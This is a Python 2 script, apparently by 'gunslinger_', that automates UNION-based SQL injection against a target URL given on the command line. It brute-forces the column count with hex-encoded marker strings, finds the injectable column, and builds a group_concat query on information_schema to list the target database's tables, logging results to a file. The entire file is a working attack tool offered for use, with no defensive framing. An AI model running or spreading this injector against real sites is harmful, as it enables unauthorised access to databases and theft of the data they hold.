#!/usr/bin/python
# -*- coding: utf-8 -*-
# This is Automatic injector by gunslinger_

import urllib
import sys
import re
import os
import socket
import httplib
import urllib2
import time
import random
	
hexa = "hex"
headhex = "0x"
ending_url = "--"
connector = "+"
MaXimum_column = 100
help = 'Usage: ./injector.py -t \"Target URL\"\n'
Try = "+from+information_schema.tables+where+table_schema=@@database--"
dengan = "AND"
gabung = "UNION"
pilih = "SELECT"
false = "1=2"
phew = ","
site = ''
log = "darkjumper.log"
proxy = "None"
count = 0
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_row = "Rows"
arg_verbose = 1
yes = "yes!"
target = "-t"
automatis = yes
line_URL = ""
count_URL = ""
gets = 0
cur_db = ""
cur_table = ""
table_num = 0
terminal = ""
num = 0

for arg in sys.argv:
	if arg == target:
		site = sys.argv[count+2]

file = open(log, "a")

if site == "":
        print help
        sys.exit(1)

if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if site[:7] != "http://": 
	site = "http://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
	
site = site.replace("+",connector)
site = site.replace("/**/",connector)
print "[!] Start to injecting : %s%s " % (site, ending_url)
file.write("\n\n[!] Start to injecting : "+site+ending_url+"\n")

if automatis == yes:
        checkfor=[]
        sitenew = site+connector+dengan+connector+false+connector+gabung+connector+pilih+connector
        coma = ""
        for x in xrange(0,MaXimum_column):
                try:
                        sys.stdout.flush()
                        gunslinger = "gunslinger_"+str(x)+"headshoot!"
                        checkfor.append(gunslinger)  
                        if x > 0: 
                                sitenew += phew
                        sitenew += headhex+gunslinger.encode(hexa)	
                        finalurl = sitenew+ending_url
                        gets+=1
                        anjing = urllib.urlopen(finalurl).read()
                        for y in checkfor:
                                Ketemu = re.findall(y,anjing)
                                if len(Ketemu) >= 1:
                                        print "[+] Column Length is:",len(checkfor)
                                        file.write("\n[+] Column Length is: "+str(len(checkfor)))
                                        nullcol = re.findall(("\d+"),y)
                                        print "[+] Null column is here :",nullcol[0]
                                        file.write("\n[+] Null column is here : "+nullcol[0])
                                        for z in xrange(0,len(checkfor)):
                                                if z > 0:
                                                        coma += ","
                                                coma += str(z)
                                        site = site+connector+dengan+connector+false+connector+gabung+connector+pilih+connector+coma
                                        print "[!] Founded:",site+ending_url
                                        file.write("\n[!] Founded: "+site+ending_url)
                                        site = site.replace(","+nullcol[0]+",",",group_concat(table_name),")
                                        print "[!] Please Check tables:",site+Try
                                        file.write("\n[!] Please Check tables: "+site+Try)
                                        print "[-] Sql injection column length saved in "+log
                                        print "[-] Ready to Autoinjecting Again if error \"true!\""
                                        sys.exit(1)
                except KeyboardInterrupt:
                	print "\n[-] Autoinjector skipped..."
                        sys.exit(1)
                        
        print "\n[!] Auto Injecting Column Length not found."
	print "[-] Ready to Execute Autoinjecting Again if error is \"true!\"\n"
        file.write("\n[!] Auto Injecting Column Length not found.")
	file.write("\n[-] Ready to Autoinjecting Again if error is\"true!\"\n")
        sys.exit(1)
file.close()
